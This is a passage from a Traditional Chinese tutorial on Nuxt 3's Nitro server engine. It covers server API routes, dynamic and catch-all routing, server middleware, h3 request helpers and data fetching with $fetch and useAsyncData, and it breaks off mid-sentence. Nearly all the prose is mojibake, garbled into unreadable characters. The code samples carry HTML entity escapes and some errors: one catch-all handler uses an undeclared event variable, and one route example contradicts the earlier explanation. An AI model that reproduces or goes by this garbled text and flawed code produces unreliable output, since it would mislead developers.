ä¸­æˆ‘å€‘å¯ä»¥ä½¿ç”¨æ‰€æä¾›çš„ä¸­é–“ä»¶æ¡†æ¶ï¼Œä¾†å»ºç«‹è·¯ç”±é é¢ä¸­çš„ä¸­é–“ä»¶ï¼Œè€Œè·¯ç”±ä¸­é–“ä»¶æœƒåœ¨åˆ°ç‰¹å®šè·¯ç”±ä¹‹å‰åŸ·è¡Œæƒ³è¦é‹è¡Œçš„é‚è¼¯ï¼Œå°æ–¼é©—è­‰æ¬Šé™ç­‰éå¸¸æ–¹ä¾¿ï¼Œä¹Ÿæ­£æ˜¯å¯¦ç¾å°èˆªå®ˆè¡› (Navigation Guards) çš„æ–¹å¼ã€‚é€™è£¡æˆ‘å€‘ä¸»è¦è¬›è¿°çš„è·¯ç”±ä¸­é–“ä»¶ï¼Œä¹Ÿå°‡æœƒèˆ‡æˆ‘å€‘å¾Œé¢æœƒæåˆ°çš„ä¼ºæœå™¨ç«¯çš„ä¸­é–“ä»¶æœ‰æ‰€ä¸åŒï¼Œé›–ç„¶åç¨±ç›¸ä¼¼ä½†èˆ‡ Nitro å•Ÿå‹•æ™‚åŸ·è¡Œçš„ä¼ºæœå™¨ä¸­é–“ä»¶å®Œå…¨ä¸åŒã€‚\nServer API èˆ‡ Nitro Engine é€™è£¡æœƒå…ˆä»‹ç´¹ä¸€ä¸‹ Nitro Engine æ˜¯ä»€éº¼æ±è¥¿ï¼ŒNitro å¯èƒ½ä¸å¤šäººè½éä½†èˆ‡ Nuxt 3 æ¯æ¯ç›¸é—œï¼ŒNitro ä¼ºæœå™¨å¼•æ“é™¤äº†æœ‰è·¨å¹³å°æ”¯æ´èˆ‡å¤šç¨®å¼·å¤§çš„åŠŸèƒ½å¤–ï¼Œæ›´åŒ…å«äº† API è·¯ç”±çš„æ”¯æ´ï¼Œæ„æ€å°±æ˜¯æˆ‘å€‘å¯ä»¥ç›´æ¥åœ¨åŸºæ–¼ Nitro çš„ Nuxt 3 ä¸Šç›´æ¥é–‹ç™¼ç”±å¾Œç«¯è™•ç†çš„é‚è¼¯æˆ–èˆ‡è³‡æ–™åº«äº’å‹•ï¼Œå†å°‡çµæœå›å‚³è‡³å‰ç«¯ï¼Œå¯¦ä½œå‡º Server APIã€‚\nNitro Engine åœ¨é–‹å§‹å»ºç½® Sever API ä¹‹å‰ï¼Œå…ˆä¾†ä»‹ç´¹ä¸€ä¸‹ Nitro ä¼ºæœå™¨å¼•æ“ï¼ŒNuxt 3 çš„ä¸€å¤§ç‰¹é»å°±æ˜¯æ¡ç”¨äº†ä¸€å€‹åç‚º Nitro çš„ä¼ºæœå™¨å¼•æ“ (Server Engine)ï¼ŒNitro åŸºæ–¼ rollup èˆ‡ h3ï¼Œç‚ºé”é«˜æ•ˆèƒ½èˆ‡å¯ç§»æ¤æ€§ç›®æ¨™è€Œå»ºæ§‹çš„æœ€å° HTTP æ¡†æ¶ã€‚\nNitro æä¾›äº†ä»¥ä¸‹å¤šç¨®åŠŸèƒ½ç‰¹è‰²ï¼Œä½¿å¾— Nuxt æ›´ä½³å®Œå–„èˆ‡å¼·å¤§ï¼Œå¦‚åŒå®˜ç¶²æ‰€èªª Nitro è®“ Nuxt ç›´æ¥è§£é–äº†æ–°çš„å…¨ç«¯èƒ½åŠ›ã€‚\nå¿«é€Ÿçš„é–‹ç™¼é«”é©—ï¼šé–‹ç®±å³ç”¨çš„ç‰¹æ€§ï¼Œç„¡éœ€ä»»ä½•é…ç½®ï¼Œå°±å¯ä»¥å•Ÿå‹•å…·æœ‰ hot module reloading çš„é–‹ç™¼ä¼ºæœå™¨ï¼Œå¯«å®Œç¨‹å¼ç¢¼å­˜æª”å¾Œï¼Œå°±èƒ½è®“ä¼ºæœå™¨è¼‰å…¥æ–°çš„ç¨‹å¼é‚è¼¯ã€‚ åŸºæ–¼æª”æ¡ˆç³»çµ±çš„è·¯ç”±ï¼šæˆ‘å€‘åªéœ€è¦å°ˆæ³¨åœ¨å»ºç«‹ä¼ºæœå™¨çš„ç›®éŒ„èˆ‡é é¢ï¼Œå°±èƒ½æ“æœ‰è‡ªå‹•è¼‰å…¥èˆ‡è·¯ç”±çš„æ•ˆæœã€‚ å¯ç§»æ¤ä¸”ä¾¿æ”œï¼šåŸºæœ¬ä¸Š Nuxt 3 ä½¿ç”¨çš„ä¾è³´å¥—ä»¶éƒ½åœ¨ package.json æª”æ¡ˆçš„ devDependencies ä¸­ï¼Œå»ºæ§‹æ­£å¼ç’°å¢ƒçš„ç¶²ç«™æ™‚ï¼ŒNitro è‡ªå‹•æ‹†åˆ†çš„ç¨‹å¼ç¢¼èˆ‡æ‰“åŒ…å‡ºä¾†çš„ .output ç›®éŒ„ä¸å†éœ€è¦å®‰è£ä¾è³´å¥—ä»¶ï¼Œæ„å‘³è‘—ä¸å†æœ‰ node_modulesï¼Œå› æ­¤éƒ¨ç½²æ™‚æ›´è¼•ä¾¿å¥½æ”œã€‚ æ··åˆæ¨¡å¼ï¼šé€é**æ··åˆæ¨¡å¼ (Hybrid mode)**å¯ä»¥å°‡ä¸€éƒ¨åˆ†é é¢é æ¸²æŸ“ç”¢ç”Ÿå‡ºéœæ…‹é é¢ï¼Œéƒ¨åˆ†é é¢æ˜¯å‹•æ…‹çš„åœ¨ä¼ºæœå™¨æˆ–å®¢æˆ¶ç«¯æ¸²æŸ“ï¼Œè®“æ¯å€‹è·¯ç”±é é¢æœ‰ä¸åŒçš„éœæ…‹æˆ–å‹•æ…‹ç”šè‡³æ“æœ‰å¿«å–è¦å‰‡ï¼Œé€™å°‡è®“ Nuxt 3 çš„é€šç”¨æ¸²æŸ“ (Universal Rendering) æ–¹å¼æ›´é€²ä¸€æ­¥æˆæ··åˆæ¸²æŸ“ (Hybrid Rendering) ä¹Ÿèƒ½çµåˆç„¡ä¼ºæœå™¨ (Serverless) ä¾†é…ç½®æ··åˆæ¨¡å¼ã€‚ çœ‹åˆ°é€™è£¡ï¼Œå¯ä»¥ç™¼ç¾ Nuxt 3 èˆ‡ Nitro éƒ½ä¸‹äº†éå¸¸å¤§çš„åŠŸå¤«ï¼Œé›–ç„¶é‚„æœ‰äº›åŠŸèƒ½å°šæœªç©©å®šèˆ‡éœ€è¦æ”¹é€²çš„åœ°æ–¹ï¼Œä½†æ˜¯å·²ç¶“ç‚ºé–‹ç™¼ä¸Šæä¾›äº†å¼·å¤§æ”¯æ´èˆ‡è‰¯å¥½çš„é«”é©—ï¼Œæ›´å¤šç‰¹æ€§èˆ‡ç´°ç¯€å¯ä»¥åƒè€ƒ Nuxt 3 - Server Engine æˆ– Nitro å®˜æ–¹ã€‚\nNuxt 3 çš„ Server ç›®éŒ„ æˆ‘å€‘å¯ä»¥é€é Nuxt 3 å°ˆæ¡ˆä¸‹çš„ server ç›®éŒ„ä¾†å»ºç«‹å…·æœ‰ hot module reloading æ”¯æ´çš„ Server API èˆ‡å¾Œç«¯è™•ç†é‚è¼¯ã€‚\nserver ç›®éŒ„å¸¸ç”¨çš„æœ‰ä¸‹é¢ä¸‰å€‹å­ç›®éŒ„ï¼š\napi åœ¨é€™å€‹ç›®éŒ„çš„æª”æ¡ˆï¼Œå°‡æœƒç”± Nuxt è‡ªå‹•è¼‰å…¥ä¸¦ç”¢ç”Ÿ /api é–‹é ­çš„è·¯ç”±ä¸¦å°æ‡‰æª”æ¡ˆåç¨±ï¼Œä¾‹å¦‚å»ºç«‹ ./server/api/hello.jsï¼Œå°±æœƒæ“æœ‰ /api/hello çš„è·¯ç”±å°æ‡‰é€™å€‹ APIï¼Œå¯ä»¥ä½¿ç”¨ http://localhost:3000/api/hello è¨ªå•è©²è·¯ç”±ã€‚\nroutes åœ¨é€™å€‹ç›®éŒ„çš„æª”æ¡ˆï¼Œå°‡æœƒç”± Nuxt è‡ªå‹•è¼‰å…¥ä¸¦ç”¢ç”Ÿå°æ‡‰æª”æ¡ˆåç¨±çš„è·¯ç”±ï¼Œä¾‹å¦‚å»ºç«‹ ./server/routes/world.jsï¼Œå°±æœƒæ“æœ‰ /world çš„è·¯ç”±å°æ‡‰é€™å€‹ APIï¼Œå¯ä»¥ä½¿ç”¨ http://localhost:3000/world è¨ªå•è©²è·¯ç”±ã€‚\nmiddleware åœ¨é€™å€‹ç›®éŒ„çš„æª”æ¡ˆï¼Œæœƒè¢« Nuxt è‡ªå‹•è¼‰å…¥ï¼Œä¸¦æ·»åŠ è‡³ä¼ºæœå™¨ä¸­é–“ä»¶ï¼Œä¸¦åœ¨æ¯å€‹ Request é€²å…¥ä¼ºæœå™¨ API çš„è·¯ç”±å‰åŸ·è¡Œã€‚\nå»ºç«‹ç¬¬ä¸€å€‹ä¼ºæœå™¨ API Nuxt æœƒè‡ªå‹•æƒæ server ç›®éŒ„ä¸­çš„æª”æ¡ˆçµæ§‹ï¼Œå»ºç«‹ Server API æ™‚é€šå¸¸ä»¥ .js æˆ– .ts ä½œç‚ºå‰¯æª”åï¼Œä¸¦ä¾ç…§å®˜æ–¹å»ºè­°ï¼Œæ¯å€‹æª”æ¡ˆéƒ½æ‡‰è©²é è¨­åŒ¯å‡º defineEventHandler() å‡½æ•¸ï¼Œä¸¦åœ¨å…¶ handler å…§å¯¦ä½œè™•ç†é‚è¼¯ã€‚\nhandler æ¥æ”¶äº†ä¸€å€‹ event åƒæ•¸ï¼Œç”¨ä¾†è§£æè«‹æ±‚çš„è³‡æ–™ï¼Œä¸¦å¯ä»¥ç›´æ¥å›å‚³ä¸€å€‹å­—ä¸²ã€JSONã€Promise æˆ–è€…ä½¿ç”¨ event.res.end() é€å‡ºè«‹æ±‚å›æ‡‰ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘å»ºç«‹ä¸€å€‹æª”æ¡ˆ ./server/api/hello.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nserver/api/hello.js 1 2 3 4 5 6 export default defineEventHandler(() =\u0026gt; { return { ok: true, data: \u0026#39;Hello World!\u0026#39; } }) å¦‚åŒ pages é é¢è·¯ç”±ä¸€æ¨£ï¼Œåœ¨ ./server/api ç›®éŒ„ä¸‹æœƒåŸºæ–¼æª”æ¡ˆç³»çµ±çµæ§‹ä¾†ç”¢ç”Ÿå‡ºç›¸å°æ‡‰çš„è·¯ç”±ï¼Œä¸¦ä¸”æœƒæ·»åŠ ä¸€å€‹è·¯ç”±å‰ç¶´ /apiï¼Œç¾åœ¨ï¼Œå¯ä»¥ä½¿ç”¨ http://localhost:3000/api/hello è¨ªå•è©²è·¯ç”±ï¼Œçœ‹è¦‹å›å‚³çš„ JSON è³‡æ–™ã€‚\nä¼ºæœå™¨è·¯ç”± åŸºæ–¼æª”æ¡ˆçš„è·¯ç”± å‰é¢çš„ä¾‹å­æœ‰æåˆ°ï¼ŒServer API çš„è·¯ç”±æ˜¯åŸºæ–¼æª”æ¡ˆçµæ§‹ä¾†è‡ªå‹•ç”¢ç”Ÿï¼Œå¦‚æœä½ ä¸æƒ³è¦æœ‰ /api çš„å‰ç¶´ï¼Œå¯ä»¥å°‡ API è™•ç†é‚è¼¯æª”æ¡ˆï¼Œæ”¾ç½®åœ¨ ./server/routes ç›®éŒ„ä¸­ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œä»¥ä¸‹çš„æª”æ¡ˆçµæ§‹æœƒç”¢ç”Ÿå…©å€‹å¯ä»¥è¨ªå•çš„ä¼ºæœå™¨ API è·¯ç”±ï¼Œåˆ†åˆ¥ç‚º /api/hello åŠ /api/worldã€‚\n1 2 3 4 5 6 nuxt-app/ â””â”€â”€ server/ â”œâ”€â”€ api/ â”‚ â””â”€â”€ hello.js â””â”€â”€ routes/ â””â”€â”€ world.js åŒ¹é…è·¯ç”±åƒæ•¸ å°‡æª”æ¡ˆåç¨±æ·»åŠ ä¸­æ‹¬è™Ÿ []ï¼Œå…¶ä¸­æ”¾å…¥æ¬²è¨­å®šçš„åƒæ•¸åç¨±ï¼Œä»¥æ­¤ä¾†è™•ç†å‹•æ…‹è·¯ç”±åŒ¹é…ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œå»ºç«‹ ./server/api/hello/[name].js æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nserver/api/hello/[name].js 1 2 3 4 export default defineEventHandler((event) =\u0026gt; { const { name } = event.context.params return `Hello, ${name}!` }) åœ¨ handler å…§å°±èƒ½ä½¿ç”¨ event.context.params ä¾†è¨ªå• name è·¯ç”±åƒæ•¸ã€‚\nåŒ¹é… HTTP è«‹æ±‚æ–¹æ³• (HTTP Request Method) æˆ‘å€‘å¯ä»¥æ·»åŠ  .getã€.postã€.put æˆ– .delete ç­‰æª”æ¡ˆåç¨±å¾Œç¶´ï¼Œä¾†åŒ¹é…å°æ‡‰çš„ HTTP request methodsã€‚\næ–°å¢ server/api/test.get.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nserver/api/test.get.js 1 2 3 4 5 6 export default defineEventHandler(() =\u0026gt; { return { ok: true, message: \u0026#39;æ¸¬è©¦ [GET] /api/test\u0026#39; } }) æ–°å¢ server/api/test.post.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nserver/api/test.post.js 1 2 3 4 5 6 export default defineEventHandler((event) =\u0026gt; { return { ok: true, message: \u0026#39;æ¸¬è©¦ [POST] /api/test\u0026#39; } }) æˆ‘å€‘ä½¿ç”¨ Postman ä¾†æ‰“é€™å…©éš» APIï¼Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨ä¸åŒçš„ HTTP Request Methodï¼Œå°±æœƒåŒ¹é…è‡³å°æ‡‰å¾Œç¶´æª”æ¡ˆä¸­çš„ handler é€²è¡Œè™•ç†ã€‚\n[GET] /api/test [POST] /api/test å¾ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘å€‘å»ºç«‹äº† test.get.js èˆ‡ test.post.js æª”æ¡ˆï¼Œåˆ†åˆ¥å°æ‡‰äº† GET èˆ‡ POST æ–¹æ³•ï¼Œå¦‚æœåŒä¸€å€‹è·¯ç”±ä½¿ç”¨äº†å…¶ä»–æ–¹æ³•è€Œç„¡æ³•åŒ¹é…è™•ç†çš„æª”æ¡ˆæ™‚ï¼Œå‰‡æœƒå›å‚³ HTTP ç‹€æ…‹ç¢¼ 405 Method Not Allowed è¡¨ç¤ºéŒ¯èª¤ã€‚\nåŒ¹é…åŒ…ç¾…è¬è±¡çš„è·¯ç”± (Catch-all Route) ä½ å¯ä»¥å»ºç«‹ [â€¦].js çš„æª”æ¡ˆï¼Œä¾†å°‡æ‰€æœ‰ä¸åŒ¹é…çš„è·¯ç”±äº¤ç”±é€™å€‹ handler ä½œè™•ç†ã€‚\nä¾‹å¦‚ï¼Œå»ºç«‹ ./server/api/catch-all/[â€¦].jsï¼Œå°‡å¯ä»¥åŒ¹é… /api/catch-all/xã€/api/catch-all/x/y\u0026hellip;ç­‰ /catch-all ä¸‹æ‰€æœ‰å±¤ç´šçš„è·¯ç”±ã€‚\nserver/api/catch-all/[â€¦].js 1 2 3 4 5 6 7 8 9 export default defineEventHandler((event) =\u0026gt; { return { ok: true, data: { url: event.req.url }, message: \u0026#39;/api/catch-all ä¸‹ä¸åŒ¹é…çš„è·¯ç”±éƒ½æœƒé€²å…¥é€™è£¡\u0026#39; } }) å»ºç«‹ ./server/api/[â€¦].js æª”æ¡ˆå¦‚ä¸‹ï¼Œå°‡å¯ä»¥æ¥æ‰‹æ‰€æœ‰ /api ä¸‹ç„¡æ³•åŒ¹é…çš„è·¯ç”±ã€‚\nserver/api/[â€¦].js 1 2 3 4 5 6 7 8 9 export default defineEventHandler(() =\u0026gt; { return { ok: true, data: { url: event.req.url }, message: \u0026#39;/api ä¸‹ä¸åŒ¹é…çš„è·¯ç”±éƒ½æœƒé€²å…¥é€™è£¡\u0026#39; } }) ä¸‹åœ–ç¤ºç¯„ä¸­ï¼Œç•¶æˆ‘å€‘è¼¸å…¥çš„è·¯ç”±å¦‚æœæ²’æœ‰è¾¦æ³•è™•ç†ï¼Œå°‡æœƒè¢« [...].js æ‰€åŒ¹é…ï¼Œä»¥æ­¤æˆ‘å€‘å¯ä»¥ä¾†å¯¦ä½œè¿”å›ã€é‡æ–°å°å‘æˆ–éŒ¯èª¤é é¢ã€‚\nä¼ºæœå™¨ä¸­é–“ä»¶ Nuxt æœƒè‡ªå‹•è¼‰å…¥ ./server/middleware ä¸­çš„æª”æ¡ˆï¼Œä¸¦æ·»åŠ è‡³ä¼ºæœå™¨ä¸­é–“ä»¶ï¼Œä¼ºæœå™¨çš„ä¸­é–“ä»¶èˆ‡è·¯ç”±ä¸­é–“ä»¶ä¸åŒçš„æ˜¯ï¼Œpages è·¯ç”±é é¢çš„è«‹æ±‚æ˜¯ä¸æœƒåŸ·è¡Œä¼ºæœå™¨ä¸­é–“ä»¶ã€‚\nä¼ºæœå™¨çš„ä¸­é–“ä»¶æœƒåœ¨æ¯å€‹ Request é€²å…¥ä¼ºæœå™¨ API çš„è·¯ç”±å‰åŸ·è¡Œï¼Œé€šå¸¸ç”¨ä¾†æ·»åŠ æˆ–æª¢æŸ¥è«‹æ±‚çš„æ¨™é ­ (headers)ã€è¨˜éŒ„è«‹æ±‚æˆ–æ“´å±•èª¿æ•´è«‹æ±‚çš„ç‰©ä»¶ã€‚\nä¼ºæœå™¨ä¸­é–“ä»¶çš„è™•ç†é‚è¼¯ï¼Œä¸æ‡‰è©²å›å‚³ä»»ä½•å…§å®¹ï¼Œä¹Ÿä¸æ‡‰ä¸­æ–·æˆ–ç›´æ¥å›æ‡‰è«‹æ±‚ï¼Œä¼ºæœå™¨ä¸­é–“ä»¶æ‡‰è©²åƒ…æª¢æŸ¥ã€æ“´å±•è«‹æ±‚ä¸Šä¸‹æ–‡æˆ–ç›´æ¥æ‹‹å‡ºéŒ¯èª¤ã€‚\nèˆ‰ç†ä¾†èªªï¼Œä½ å¯ä»¥æ–°å¢ ./server/middleware/log.js ç”¨ä¾†è¨˜éŒ„æ¯å€‹è«‹æ±‚çš„ URLã€‚\nserver/middleware/log.js 1 2 3 export default defineEventHandler((event) =\u0026gt; { console.log(\u0026#39;New request: \u0026#39; + event.req.url) }) æˆ–è€…ï¼Œæ–°å¢ ./server/middleware/auth.js ç”¨ä¾†è§£æè«‹æ±‚æˆ–æ“´å±•è«‹ç”±ç‰©ä»¶ã€‚\nserver/middleware/auth.js 1 2 3 export default defineEventHandler((event) =\u0026gt; { event.context.auth = { username: \u0026#39;ryan\u0026#39; } }) ä¼ºæœå™¨æ’ä»¶ Nuxt æœƒè‡ªå‹•æƒæä¸¦è¼‰å…¥ ./server/plugins ç›®éŒ„ä¸‹çš„æª”æ¡ˆï¼Œä¸¦å°‡ä»–å€‘è¨»å†Šç‚º Nitro çš„æ’ä»¶ï¼Œåœ¨ Nitro å•Ÿå‹•æ™‚ï¼Œé€™äº›æ’ä»¶å°‡æœƒåœ¨ä¼ºæœå™¨è¼‰å…¥ä¸¦åŸ·è¡Œï¼Œæ’ä»¶å…è¨±æ“´å±• Nitro åŸ·è¡Œæ™‚çš„è¡Œç‚ºåŠé€£æ¥åˆ°ç”Ÿå‘½é€±æœŸçš„äº‹ä»¶ã€‚\næ›´å¤šç´°ç¯€å¯ä»¥åƒè€ƒ Nitro Pluginsã€‚\nä¼ºæœå™¨é€šç”¨åŠŸèƒ½ Nuxt ä¸­ä¼ºæœå™¨çš„è·¯ç”±ï¼Œæ˜¯ç”± unjs/h3 æ‰€æä¾›ï¼Œh3 å…§å»ºä¸€äº›æ–¹ä¾¿å¯¦ç”¨çš„ helpersï¼Œå¯ä»¥åƒè€ƒ Available H3 Request Helpersã€‚\nä¼ºæœå™¨è·¯ç”±å¸¸ç”¨çš„ HTTP è«‹æ±‚è™•ç† è™•ç† HTTP è«‹æ±‚ä¸­çš„ Body 1 2 3 4 5 6 7 export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) return { ok: true, data: body } }) å¯ä»¥ä½¿ç”¨ readBody(event) ä¾†è§£æè«‹æ±‚ä¸­çš„ Bodyï¼Œæ³¨æ„ readBody() æ˜¯ä¸€å€‹ç•°æ­¥å‡½æ•¸ï¼Œè¨˜å¾— await ç­‰å¾…è§£æå®Œæˆã€‚\nè™•ç† URL ä¸­çš„æŸ¥è©¢åƒæ•¸ (Query Parameters) å¯ä»¥ä½¿ç”¨ getQuery(evnet) ä¾†è§£ææŸ¥è©¢åƒæ•¸ã€‚\n1 2 3 4 5 6 7 8 9 export default defineEventHandler((event) =\u0026gt; { const query = getQuery(event) return { ok: true, data: { name: query.name } } }) ç•¶è«‹æ±‚ URL ç‚º /api/query?name=ryanï¼Œå¯ä»¥è§£æå‡ºæŸ¥è©¢åƒæ•¸ query.nameã€‚\nè§£æ HTTP è«‹æ±‚æ‰€å¤¾å¸¶çš„ Cookie å¯ä»¥ä½¿ç”¨ parseCookies(event) ä¾†è§£æè«‹æ±‚æ‰€å¤¾å¸¶çš„ Cookieã€‚\n1 2 3 4 5 6 7 8 9 export default defineEventHandler((event) =\u0026gt; { const cookies = parseCookies(event) return { ok: true, data: { cookies } } }) æˆ‘é€éç€è¦½å™¨çš„é–‹ç™¼å·¥å…·ï¼Œæ‰‹å‹•æ·»åŠ äº†ä¸€çµ„ cookie åç‚º tokenï¼ŒServer API å¯ä»¥é€é parseCookies() ä¾†è§£æå‡ºç€è¦½å™¨è‡ªå‹•å¤¾å¸¶çš„ cookieã€‚\né€²éšä½¿ç”¨ç¯„ä¾‹ Nitro é…ç½® ä½ å¯ä»¥åœ¨ nuxt.config.ts ä¸­ä½¿ç”¨ nitro å±¬æ€§ä¾†é…ç½® Nitro è¨­å®šã€‚\nnuxt.config.ts 1 2 3 4 export default defineNuxtConfig({ // https://nitro.unjs.io/config nitro: {} }) ä½¿ç”¨å·¢ç‹€è·¯ç”± ä½ å¯ä»¥ç›´æ¥ä½¿ç”¨ h3 çš„ createRouter() æ–¹æ³•ä¾†å»ºç«‹å·¢ç‹€è·¯ç”±ã€‚\n1 2 3 4 5 6 7 import { createRouter } from \u0026#39;h3\u0026#39; const router = createRouter() router.get(\u0026#39;/\u0026#39;, () =\u0026gt; \u0026#39;Hello World\u0026#39;) export default router ä¼ºæœå™¨å„²å­˜ Nitro æä¾›äº†ä¸€å€‹è·¨å¹³å°çš„å„²å­˜å±¤ï¼Œä½ å¯ä»¥ Nitro çš„é…ç½®ä¸­è¨­å®š storage å±¬æ€§ï¼Œä¾†é…ç½®é¡å¤–çš„å„²å­˜æ›è¼‰ä½ç½®ï¼Œå®˜ç¶²æä¾›äº†ä¸€å€‹ä½¿ç”¨ Redis çš„ç¯„ä¾‹ã€‚\næ›´å¤š Nitro ä¼ºæœå™¨çš„è¨­å®šèˆ‡ä½¿ç”¨å¯ä»¥åƒè€ƒå®˜ç¶²ã€‚\nNitro ä¼ºæœå™¨å¼•æ“å°‡ Nuxt 3 æå‡è‡³å¦ä¸€å€‹å¢ƒç•Œï¼Œä¸åƒ…åŠŸèƒ½å¼·å¤§ä¸”è®“é–‹ç™¼ä¸­æ“æœ‰ä¸éŒ¯çš„é«”é©—ï¼Œä¼ºæœå™¨è·¯ç”±æ›´æ˜¯èƒ½åœ¨å¾Œç«¯ç›´æ¥è™•ç†é‚è¼¯å¯¦ä½œ Server APIï¼Œè€Œæ¥ä¸‹ä¾†å°‡ä»‹ç´¹å¦‚ä½•åœ¨ Nuxt æ‰“ API å–å¾—è³‡æ–™ã€‚\nè³‡æ–™ç²å– (Data Fetching) Nuxt æä¾›äº† $fetch åŠå››ç¨®çµ„åˆå¼å‡½æ•¸ (Composables)ï¼Œä¾†é€²è¡Œè³‡æ–™ç²å–ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œæˆ‘å€‘ä¸éœ€è¦å†é¡å¤–å®‰è£ä»»ä½• HTTP Client ï¼Œå¦‚ axios ä¾†ç™¼é€ HTTP è«‹æ±‚ï¼Œå› ç‚º Nuxt æœ¬èº«å°±è‡ªå¸¶äº†æ‰“ API çš„æ–¹æ³•ï¼Œè€Œä¸”åœ¨é é¢ã€å…ƒä»¶æˆ–æ’ä»¶ä¸­éƒ½èƒ½ç›´æ¥å‘¼å«åšä½¿ç”¨ï¼Œéå¸¸æ–¹ä¾¿ã€‚\né¦–å…ˆï¼Œæˆ‘å€‘å…ˆä»‹ç´¹ä¸€ä¸‹ $fetch é€™å€‹ç”± Nuxt æä¾›ä½¿ç”¨ ohmyfetch å¥—ä»¶æ‰€å°è£çš„ helperï¼Œ$fetch å¯ä»¥åœ¨ Nuxt ä¸­ç”¨æ–¼ç™¼é€ HTTP è«‹æ±‚ã€‚\nå¦‚æœåœ¨ä¼ºæœå™¨ç«¯æ¸²æŸ“çš„æœŸé–“ï¼Œå‘¼å« $fetch æ‰“å…§éƒ¨ API è·¯ç”±ï¼Œä¹Ÿå°±æ˜¯æ‰“æˆ‘å€‘è‡ªå·±åœ¨ ./server ä¸‹å¯¦ä½œçš„å¾Œç«¯ APIï¼Œé‚£éº¼å› ç‚ºä½¿ç”¨ $fetch çš„é—œä¿‚ï¼ŒNuxt æœƒæ¨¡æ“¬è«‹æ±‚ï¼Œæ”¹ç”±ç›´æ¥å‘¼å«å…§éƒ¨ API çš„è™•ç†å‡½æ•¸ï¼Œé€™æ¨£å°±èƒ½ç¯€çœé¡å¤–çš„ API å‘¼å«ã€‚\nä½¿ç”¨çš„æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\n1 $fetch(url, options) æˆ‘å€‘å¯ä»¥ä½¿ç”¨ $fetch(\u0026rsquo;/api/count\u0026rsquo;) å»ºç«‹ä¸€å€‹ GET è«‹æ±‚ï¼Œç™¼é€è‡³ /api/count å¾Œæœƒè¿”å›ä¸€å€‹ Promiseï¼Œå®Œæˆå¾Œæˆ‘å€‘å°±å¯ä»¥æ¥æ”¶å›å‚³çš„è³‡æ–™ã€‚\n$fetch çš„ options çš„åƒæ•¸åŠå»ºç«‹æ””æˆªå™¨ç­‰åŠŸèƒ½å¯ä»¥åƒè€ƒ ohmyfetchï¼Œä¸éå‘¢ï¼Œæˆ‘å€‘é‚„æœƒä½¿ç”¨ Nuxt æä¾›çš„çµ„åˆå‡½æ•¸çµåˆ $fetch ä¾†æ‰“ APIã€‚\næ¥ä¸‹ä¾†æˆ‘å€‘å°±ä¾†ä¾åºä»‹ç´¹ï¼Œå¦‚ä½•ä½¿ç”¨ Nuxt æä¾›çš„å››ç¨®çµ„åˆå‡½æ•¸ä¾†å¾ API ç²å–è³‡æ–™ã€‚\nuseAsyncData é€™å€‹ useAsyncData() çµ„åˆå‡½æ•¸ï¼Œå…¶å¯¦ä¸æ˜¯å‚³å…¥ URL ç›´æ¥å‘¼å«å°±æœƒç™¼å‡º API è«‹æ±‚ï¼Œè€Œæ˜¯ Nuxt å¯ä»¥é€éé€™å€‹å‡½æ•¸ä¾†æ·»åŠ ç•°æ­¥è«‹æ±‚è³‡æ–™çš„é‚è¼¯ã€‚\nuseAsyncData çµ„åˆå‡½æ•¸èƒ½æ¥æ”¶ keyã€handler èˆ‡ optionsï¼Œå…¶ä¸­ handler æœƒä¾†æ·»åŠ è«‹æ±‚ç•°æ­¥è³‡æ–™çš„é‚è¼¯ã€‚ç•¶æˆ‘å€‘åœ¨é é¢ã€å…ƒä»¶å’Œæ’ä»¶ä¸­å‘¼å« useAsyncDataï¼Œä¸¦ç­‰å¾…å›å‚³çš„ Promiseï¼Œæˆ‘å€‘çš„é é¢æˆ–å…ƒä»¶çš„æ¸²æŸ“å°‡æœƒé˜»å¡è·¯ç”±è¼‰å…¥è‡³ handler ç•°æ­¥é‚è¼¯è™•ç†å®Œç•¢å¾Œæ‰æœƒç¹¼çºŒåŸ·è¡Œï¼Œä¹Ÿå°±æ˜¯èªªï¼Œæ•´å€‹é é¢å…ƒä»¶å°‡æœƒç­‰å¾…æ‰€æœ‰ä½¿ç”¨ useAsyncData å‘¼å«çš„ API å›å‚³å®Œæˆå¾Œæ‰æœƒé–‹å§‹é€²è¡Œæ¸²æŸ“ã€‚\nèˆ‰å€‹ä¾‹å­ï¼Œæˆ‘å€‘æ–°å¢ä¸€å€‹ Server APIï¼Œä¸¦ç¨å¾®æ·»åŠ ä¸€ä¸‹å»¶é²ï¼Œæ¨¡æ“¬ API ç´„éœ€è¦è™•ç† 2 ç§’æ‰å›å‚³è³‡æ–™ï¼Œ./server/api/count.js å…§å®¹å¦‚ä¸‹ï¼š\nserver/api/count.js 1 2 3 4 5 6 7 8 9 let counter = 0 export default defineEventHandler(async () =\u0026gt; { await new Promise((resolve) =\u0026gt; setTimeout(resolve, 2 * 1000)) // ç­‰å¾… 2 ç§’ counter += 1 return JSON.stringify(counter) }) æ–°å¢ä¸€å€‹è·¯ç”±é é¢ï¼Œ./pages/count/useAsyncData.vue å…§å®¹å¦‚ä¸‹ï¼š\npages/count/useAsyncData.vue 1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;text-4xl text-gray-600\u0026#34;\u0026gt;ç€è¦½æ¬¡æ•¸\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;{{ data }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { data } = await useAsyncData(\u0026#39;count\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/count\u0026#39;)) \u0026lt;/script\u0026gt; ç•¶æˆ‘å€‘ç€è¦½ /count/useAsyncData æ™‚ï¼Œæœƒæ‰“ /api/count é€™éš» 